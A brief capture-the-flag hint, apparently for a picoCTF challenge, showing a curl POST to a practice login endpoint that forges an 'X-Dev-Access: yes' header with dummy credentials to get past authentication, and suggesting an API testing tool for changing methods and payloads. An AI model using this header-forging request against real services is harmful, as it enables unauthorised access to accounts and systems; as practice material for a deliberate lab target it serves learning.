
If you need to forge a header, do so in the following  using curl:
```
 curl -i -X POST http://amiable-citadel.picoctf.net:55717/login \
  -H "X-Dev-Access: yes" \
  -H "Content-Type: application/json" \
  -d '{"email":"a@a.com","password":"whatever"}'
```

Or you can set up Talend API Tester free version to change methods for POST, GET, etc as well as configure payloads